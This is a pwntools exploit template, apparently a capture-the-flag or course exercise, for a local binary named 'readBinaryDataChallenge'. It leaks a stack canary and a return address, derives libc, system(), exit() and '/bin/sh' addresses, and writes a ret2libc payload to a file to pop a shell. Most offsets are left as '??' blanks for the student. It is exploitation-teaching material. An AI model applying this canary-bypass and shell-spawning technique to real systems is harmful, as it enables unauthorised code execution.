from pwn import *
libc = ELF('/lib/i386-linux-gnu/libc.so.6')

# Number of bytes required to reach Return Address
BUF_SIZE = ??
log.info(f"Bytes until return address: {BUF_SIZE}")


# Number of bytes that our input buffer is
INPUT_SIZE = ??
log.info(f"Bytes for input: {INPUT_SIZE}")


# Special file name that will leak canary and hold our exploit
# ! Make sure the final address leaked is main()'s return addr !
special_file = "??"   # Replace '??'


# ==== You can ignore this part ====
# We need to leak and save the canary value at runtime because it is different each time we execute 'readBinaryData0'
pty = process.PTY
io = process(argv=["./readBinaryDataChallenge", special_file], stdin=pty, stdout=pty)
leaks = io.recv()
print(leaks)

# Save leaked return addr for 'main()'
main_ret_addr = leaks.split(b".")[-1].decode()
log.info(f"Address of main()'s return! {main_ret_addr}")

# Get the canary
canary = leaks.split(b"0x42424242")[-1].split(b".")[1].decode()
log.info(f"Canary found! {canary}")
# ==== You can ignore this part ====


system_offset = ??        # Replace '??'
start_main_offset = ??    # Replace '??'


start_main_to_system = ?? - ??    # Replace '??'


# We already have main()'s return address but we have to make it the beginning of '__libc_start_main()' and not midway through - Hint: GDB will show you how far into '__libc_start_main()' you are going to return
libc_start_main_addr = int(main_ret_addr, 16) - ??   # Replace '??'


# Final address of 'system()'!
system_returnAddress = libc_start_main_addr + start_main_to_system
log.info(f"System() Addr! {hex(system_returnAddress)}")


# Calculate LIBC base address now that we know 'system()'
libc_base = system_returnAddress - ??     # Replace '??'
log.info(f"LIBC Base Addr! {hex(libc_base)}")


# Make a clean exit
clean_exit = p32(libc_base + ??) # Replace '??' with offset of 'exit()'


# Addr of '/bin/sh' in libc - Placing '/bin/sh' on the stack DOES NOT WORK
command_str_addr = p32(libc_base + ??) # Replace '??' with offset of '/bin/sh' string within libc


# Crafting the final exploit!
exploit = b''
exploit += b"A" * ??
exploit += p32(int(canary,16))
exploit += b"A" * (BUF_SIZE - INPUT_SIZE - 4) # '4' is the number of bytes the canary takes up
exploit += p32(system_returnAddress)
exploit += ??
exploit += ??
exploit += p32(0)


# Write exploit to a file as bytes (wb)
with open(special_file, "wb") as fd:
    fd.write(exploit)

# Continue program execution to make it read the file with our exploit!
#io.sendline()
io.interactive()
